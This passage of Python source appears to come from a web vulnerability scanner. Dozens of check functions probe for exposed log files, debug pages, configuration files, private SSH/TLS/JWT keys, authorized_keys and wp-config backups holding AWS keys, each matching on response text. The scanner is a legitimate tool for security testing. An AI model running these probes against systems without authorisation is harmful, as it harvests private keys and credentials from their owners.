  vulnDsc = "common error log files"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/routes/error_log','/config/error_log','/error_log','/errors_log','/logs/error.log','/logs/errors.log','/log/error.log','/log/errors.log','/errors/errors.log','/error/error.log','/errors.log','/error.log','/error.txt','/errors.txt','/admin/logs/error.log','/admin/logs/errors.log','/admin/log/error.log','/admin/error.log','/admin/errors.log','/Hostname','/Hostname','/MyErrors.log','/log.txt','/logs.txt','/log.log','/application/logs/application.log','/application/logs/default.log']
  redirAllow = False
  statusF = 200
  textF = 'Exception'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text and 'Fatal' in z.text and 'Segmentation' in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# exposed-glances-api
def attMOD9(progScope):
  myKey = "f5ba0509eb43aa53e27109a92dbb046d"
  vulnCat = "Exposure"
  vulnName = "Expo9"
  severity = "P4"
  vulnDsc = "Exposed Glances API"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/']
  redirAllow = False
  statusF = 200
  textF = 'title">Glances</title>'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# exposed-prometheus-log
def attMOD10(progScope):
  myKey = "8622485a01a6fa44795ea95abd643a4d"
  vulnCat = "Exposure"
  vulnName = "Expo10"
  severity = "P4"
  vulnDsc = "Exposed Prometheus"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/prometheus']
  redirAllow = False
  statusF = 200
  textF = 'gateway_request_total'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# jboss-seam-debug-page
def attMOD11(progScope):
  myKey = "0b724ab779049cd469482cacd510f5ac"
  vulnCat = "Exposure"
  vulnName = "Expo11"
  severity = "P3"
  vulnDsc = "Jboss Seam Debug Page Enabled"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/debug.seam']
  redirAllow = False
  statusF = 200
  textF = 'org.jboss.seam'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# laravel-log-file
def attMOD12(progScope):
  myKey = "03d3a54fad780f26070a89db9565ab9d"
  vulnCat = "Exposure"
  vulnName = "Expo12"
  severity = "P2"
  vulnDsc = "Laravel log file publicly accessible"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/storage/logs/laravel.log']
  redirAllow = False
  statusF = 200
  textF = 'InvalidArgumentException'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text or 'local.ERROR' in z.text or 'ErrorException' in z.text or 'syntax error' in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# aravel-telescope
def attMOD13(progScope):
  myKey = "e2dac4b4abbee6057b7cb2c53279159d"
  vulnCat = "Exposure"
  vulnName = "Expo13"
  severity = "P3"
  vulnDsc = "Laravel Telescope Disclosure"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/telescope/requests']
  redirAllow = False
  statusF = 200
  textF = '<title>Telescope</title>'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# lucee-stack-trace
def attMOD14(progScope):
  myKey = "e914e00cad97cfde86b939783176ac3a"
  vulnCat = "Exposure"
  vulnName = "Expo14"
  severity = "P4"
  vulnDsc = "Lucee Stack Trace Error"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/']
  redirAllow = False
  statusF = 200
  textF = 'lucee.runtime'
  condition = lambda z : True if( (z.status_code == statusF or z.status_code == 500) and (textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# npm-log-file
def attMOD15(progScope):
  myKey = "0973ce6f7e96579272e0e141b46d91b5"
  vulnCat = "Exposure"
  vulnName = "Expo15"
  severity = "P4"
  vulnDsc = "Publicly accessible NPM Log file"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/npm-debug.log']
  redirAllow = False
  statusF = 200
  textF = 'info it worked if it ends with ok'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# oracle-ebs-sqllog-disclosure
def attMOD16(progScope):
  myKey = "0afd57d4f68452aa42d307ed49249cb1"
  vulnCat = "Exposure"
  vulnName = "Expo16"
  severity = "P3"
  vulnDsc = "Oracle EBS SQL Log Disclosure"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/OA_HTML/bin/sqlnet.log']
  redirAllow = False
  statusF = 200
  textF = 'DESCRIPTION='
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# php-debug-bar
def attMOD17(progScope):
  myKey = "68d0a302236b9c80d6fb177eca7dc1a3"
  vulnCat = "Exposure"
  vulnName = "Expo17"
  severity = "P2"
  vulnDsc = "PHP Debug bar"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/_debugbar/open?max=20&offset=0']
  redirAllow = False
  statusF = 200
  textF = '"id":"'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text and '"datetime":' in z.text and '"method"' in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# production-logs
def attMOD18(progScope):
  myKey = "1f5df38f88ff346f41e3472d06370ad9"
  vulnCat = "Exposure"
  vulnName = "Expo18"
  severity = "P4"
  vulnDsc = "Discover production log files"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/log/production.log','/logs/production.log','/production.log']
  redirAllow = False
  statusF = 200
  textF = 'Connecting to database specified by database.yml'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# pyramid-debug-toolbar
def attMOD19(progScope):
  myKey = "24ce92c0477052080ea7eb57132ed2e8"
  vulnCat = "Exposure"
  vulnName = "Expo19"
  severity = "P3"
  vulnDsc = "Pyramid Debug Toolbar"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/_debug_toolbar/']
  redirAllow = False
  statusF = 200
  textF = '<title>Pyramid Debug Toolbar</title>'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# rails-debug-mode
def attMOD20(progScope):
  myKey = "0369819f271f507d04a9d8efc1db98f8"
  vulnCat = "Exposure"
  vulnName = "Expo20"
  severity = "P3"
  vulnDsc = "Rails Debug Mode Enabled"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/1238a92f573a48e58d356c42ca2c9610']
  redirAllow = False
  statusF = 200
  textF = 'Rails.root:'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# roundcube-log-disclosure
def attMOD21(progScope):
  myKey = "61fcd30b53cc102e09516a795ab40bc5"
  vulnCat = "Exposure"
  vulnName = "Expo21"
  severity = "P4"
  vulnDsc = "Roundcube Log Disclosure"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/roundcube/logs/sendmail','/roundcube/logs/errors.log']
  redirAllow = False
  statusF = 200
  textF = 'IMAP Error:'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# struts-debug-mode
def attMOD22(progScope):
  myKey = "09fdc789194a847e69b24ec0be54d2cf"
  vulnCat = "Exposure"
  vulnName = "Expo22"
  severity = "P4"
  vulnDsc = "Apache Struts setup in Debug-Mode"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/']
  redirAllow = False
  statusF = 200
  textF = '<struts.actionMapping>'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# struts-problem-report
def attMOD23(progScope):
  myKey = "1cc2b7d0190f9e899df60ec74ec3d100"
  vulnCat = "Exposure"
  vulnName = "Expo23"
  severity = "P4"
  vulnDsc = "Apache Struts in Dev Mode"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/']
  redirAllow = False
  statusF = 200
  textF = '<title>Struts Problem Report</title>'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# trace-axd-detect
def attMOD24(progScope):
  myKey = "4c1bf692b564bcf5b504a2f79e59e396"
  vulnCat = "Exposure"
  vulnName = "Expo24"
  severity = "P4"
  vulnDsc = "ASP.NET Trace.AXD Information Leak"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/Trace.axd']
  redirAllow = False
  statusF = 200
  textF = '<td><h1>Application Trace</h1></td>'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# wp-app-log
def attMOD25(progScope):
  myKey = "506368dd0bd0d21e4bd199ed8bc5e67c"
  vulnCat = "Exposure"
  vulnName = "Expo25"
  severity = "P4"
  vulnDsc = "Discover wp-app.log Files"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/wp-app.log']
  redirAllow = False
  statusF = 200
  textF = 'LANG'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text and 'Array' in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# zm-system-log-detect
def attMOD26(progScope):
  myKey = "f25b76df8d9c4a3d5589e9d47f716d4d"
  vulnCat = "Exposure"
  vulnName = "Expo26"
  severity = "P4"
  vulnDsc = "zm-system-log-detect"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/?view=log','/zm/?view=log']
  redirAllow = False
  statusF = 200
  textF = '<title>ZM - System Log</title>'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# server-private-keys
def attMOD27(progScope):
  myKey = "ffc52e0440849ee79d68861aee4e8398"
  vulnCat = "Exposure"
  vulnName = "Expo27"
  severity = "P1"
  vulnDsc = "Detect Private SSH, TLS, and JWT Keys"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/localhost.key','/host.key','/www.key','/private-key','/privatekey.key','/server.key','/my.key','/key.pem','/ssl/localhost.key','/id_rsa','/id_dsa','/.ssh/id_rsa','/.ssh/id_dsa','/config/jwt/private.pem','/jwt/private.pem','/var/jwt/private.pem','/private.pem']
  # urlList = ['/.ssh/id_rsa']
  redirAllow = False
  statusF = 200
  textF = 'BEGIN OPENSSH PRIVATE KEY'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text or 'BEGIN PRIVATE KEY' in z.text or 'BEGIN RSA PRIVATE KEY' in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# sftp-credentials-exposure
def attMOD28(progScope):
  myKey = "c44e33a12e9ecf15a8b5f615f464fe01"
  vulnCat = "Exposure"
  vulnName = "Expo28"
  severity = "P3"
  vulnDsc = ""
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/sftp-config.json','/ftpsync.settings']
  redirAllow = False
  statusF = 200
  textF = 'file_permissions'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# ssh-authorized-keys
def attMOD29(progScope):
  myKey = "09a2042b5b96932adff72d125bf5bbc7"
  vulnCat = "Exposure"
  vulnName = "Expo29"
  severity = "P4"
  vulnDsc = "SSH Authorized Keys"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/.ssh/authorized_keys','/_/.ssh/authorized_keys']
  redirAllow = False
  statusF = 200
  textF = 'ssh-dss'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text or 'ssh-ed25519' in z.text or 'ssh-rsa' in z.text or 'ecdsa-sha2-nistp256' in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# ssh-known-hosts
def attMOD30(progScope):
  myKey = "f1202e4eb0c4a4549ba0a4cd992c8b61"
  vulnCat = "Exposure"
  vulnName = "Expo30"
  severity = "P4"
  vulnDsc = "SSH Known Hosts"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/.ssh/known_hosts','/.ssh/known_hosts.old']
  redirAllow = False
  statusF = 200
  textF = 'ssh-'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# svnserve-config
def attMOD31(progScope):
  myKey = "80314fdae58110fd9e76376453d2b4fa"
  vulnCat = "Exposure"
  vulnName = "Expo31"
  severity = "P4"
  vulnDsc = "svnserve config file disclosure"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/svnserve.conf']
  redirAllow = False
  statusF = 200
  textF = 'This file controls the configuration of the svnserve daemon'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# syfmony-profiler
def attMOD32(progScope):
  myKey = "17c1299444a11fca79893c28182d5c3e"
  vulnCat = "Exposure"
  vulnName = "Expo32"
  severity = "P3"
  vulnDsc = "SymfonyProfiler information leakage"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/_profiler/phpinfo.php','/_profiler/phpinfo']
  redirAllow = False
  statusF = 200
  textF = '$_SERVER'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text or '$_ENV' in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# symfony-database-config
def attMOD33(progScope):
  myKey = "c92f15d5b7dbc930b8f3f7195d0dbab3"
  vulnCat = "Exposure"
  vulnName = "Expo33"
  severity = "P2"
  vulnDsc = "Symfony Database Configuration Exposure"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/config/databases.yml']
  redirAllow = False
  statusF = 200
  textF = 'param:'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text and 'class:' in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# symfony-profiler
def attMOD34(progScope):
  myKey = "642654429d89e06f76e3e95127516c0d"
  vulnCat = "Exposure"
  vulnName = "Expo34"
  severity = "P2"
  vulnDsc = "Symfony Profiler"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/_profiler/empty/search/results?limit=10']
  redirAllow = False
  statusF = 200
  textF = '<title>Symfony Profiler</title>'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# symfony-security-config
def attMOD35(progScope):
  myKey = "adf4456bc2c1e34a2301ee715e51a78c"
  vulnCat = "Exposure"
  vulnName = "Expo35"
  severity = "P4"
  vulnDsc = "Symfony Security Configuration Exposure"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/config/packages/security.yaml','/app/config/security.yml']
  redirAllow = False
  statusF = 200
  textF = 'security:'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text and 'firewalls:' in z.text and 'access_control:' in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# web-config
def attMOD36(progScope):
  myKey = ""
  vulnCat = "Exposure"
  vulnName = "Expo36"
  severity = "P4"
  vulnDsc = "Web Config file"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/web.config']
  redirAllow = False
  statusF = 200
  textF = '<configuration>'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# wpconfig-aws-keys
def attMOD37(progScope):
  myKey = "a3e1f4895c98d4a0a0754e34eb453574"
  vulnCat = "Exposure"
  vulnName = "Expo37"
  severity = "P2"
  vulnDsc = "AWS S3 keys Leak"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/wp-config.php-backup','/%c0']
  redirAllow = False
  statusF = 200
  textF = 'DB_PASSWORD'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text and 'access-key-id' in z.text and 'DB_NAME' in z.text and 'secret-access-key' in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# xprober-service
def attMOD38(progScope):
  myKey = "0e1296ad10d091acc7a1a2c4480d886b"
  vulnCat = "Exposure"
  vulnName = "Expo38"
  severity = "P4"
  vulnDsc = "X Prober server information leakage"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/xprober.php']
  redirAllow = False
  statusF = 200
  textF = '"appName":"X Prober"'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# yii-debugger
def attMOD39(progScope):
  myKey = "2b4db26a277b0eac09d4b0d5308101e6"
  vulnCat = "Exposure"
  vulnName = "Expo39"
  severity = "P4"
  vulnDsc = "View Yii Debugger Information"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/debug/default/view.html','/debug/default/view','/frontend/web/debug/default/view','/web/debug/default/view','/sapi/debug/default/view']
  redirAllow = False
  statusF = 200
  textF = '<title>Yii Debugger</title>'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# zend-config-file
def attMOD40(progScope):
  myKey = "d3db4d2ef3f49fb40eed82bb38900f3d"
  vulnCat = "Exposure"
  vulnName = "Expo40"
  severity = "P2"
  vulnDsc = "Zend Configuration File"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/application/configs/application.ini','/admin/configs/application.ini','/application.ini','/aplicacao/application/configs/application.ini','/cloudexp/application/configs/application.ini','/cms/application/configs/application.ini','/moto/application/configs/application.ini','/Partners/application/configs/application.ini','/radio/application/configs/application.ini','/seminovos/application/configs/application.ini','/shop/application/configs/application.ini','/site_cg/application/configs/application.ini','/slr/application/configs/application.ini']
  redirAllow = False
  statusF = 200
  textF = 'resources.db.params.'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# axis-happyaxis
def attMOD41(progScope):
  myKey = "a4921df38bb9beedfe39ecc6d72f3e66"
  vulnCat = "Exposure"
  vulnName = "Expo41"
  severity = "P4"
  vulnDsc = "Axis Happyaxis Exposure"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/axis2/axis2-web/HappyAxis.jsp']
  redirAllow = False
  statusF = 200
  textF = 'Axis Happiness Page'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# bower-json
def attMOD42(progScope):
  myKey = "42a936e6f9d2f366d7784e04a844e40f"
  vulnCat = "Exposure"
  vulnName = "Expo42"
  severity = "P4"
  vulnDsc = "bower.json file disclosure"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/bower.json']
  redirAllow = False
  statusF = 200
  textF = '"name":'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text and '"license"' in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# cold-fusion-cfcache-map
def attMOD43(progScope):
  myKey = "205af954ecd32d01fca77c1d7e4ec935"
  vulnCat = "Exposure"
  vulnName = "Expo43"
  severity = "P4"
  vulnDsc = "Discover Cold Fusion cfcache.map Files"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/cfcache.map']
  redirAllow = False
  statusF = 200
  textF = 'Mapping='
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text and 'SourceTimeStamp=' in z.text)) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# insecure-crossdomain
def attMOD44(progScope):
  # https://medium.com/@x41x41x41/exploiting-crossdomain-xml-missconfigurations-3c8d407d05a8
  myKey = "b8995be512af7308cec5f4cfb85c6daf"
  vulnCat = "Exposure"
  vulnName = "Expo44"
  severity = "P4"
  vulnDsc = "Insecure cross-domain.xml file"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/crossdomain.xml']
  redirAllow = False
  statusF = 200
  textF = '<allow-access-from domain="*"/>'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text and '<site-control permitted-cross-domain-policies="by-content-type"/>' not in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# db-schema
def attMOD45(progScope):
  myKey = "fe0d75c1a1578e5986315edbb0967324"
  vulnCat = "Exposure"
  vulnName = "Expo45"
  severity = "P4"
  vulnDsc = "Discover db schema files"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/db/schema.rb','/database/schema.rb','/schema.rb']
  redirAllow = False
  statusF = 200
  textF = 'This file is auto-generated from the current state of the database.'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# domcfg-page
def attMOD46(progScope):
  myKey = "bf34fa687bff061de5dbba15a99c198c"
  vulnCat = "Exposure"
  vulnName = "Expo46"
  severity = "P4"
  vulnDsc = "Lotus Domino Configuration Page"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/domcfg.nsf']
  redirAllow = False
  statusF = 200
  textF = 'Web Server Configuration'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# drupal-install
def attMOD47(progScope):
  myKey = "9a539ee75c4a07a81393139e79eea4e8"
  vulnCat = "Exposure"
  vulnName = "Expo47"
  severity = "P4"
  vulnDsc = "Drupal Install"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/install.php?profile=default']
  redirAllow = False
  statusF = 200
  textF = '<title>Choose language | Drupal</title>'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# ds-store-file
def attMOD48(progScope):
  myKey = "2c77228dcf4654c3c8d7bd07e8fc2d69"
  vulnCat = "Exposure"
  vulnName = "Expo48"
  severity = "P4"
  vulnDsc = "Directory Listing via DS_Store"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/.DS_Store']
  redirAllow = False
  statusF = 200
  textF = '\x00@\x00'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# exposed-alps-spring
def attMOD49(progScope):
  myKey = "5076f0c988e205d628eb8f661ccec1d3"
  vulnCat = "Exposure"
  vulnName = "Expo49"
  severity = "P3"
  vulnDsc = "Exposed Spring Data REST Application-Level Profile Semantics (ALPS)"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/profile','/api/profile','/alps/profile']
  redirAllow = False
  statusF = 200
  textF = '_links'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text and '/alps/' in z.text and 'profile' in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# filezilla-exposed
def attMOD50(progScope):
  myKey = "36749034a1e50d288362661c95ea279e"
  vulnCat = "Exposure"
  vulnName = "Expo50"
  severity = "P3"
  vulnDsc = "Filezilla"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/filezilla.xml','/sitemanager.xml','/FileZilla.xml']
  redirAllow = False
  statusF = 200
  textF = '<FileZilla'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text )) else False
  
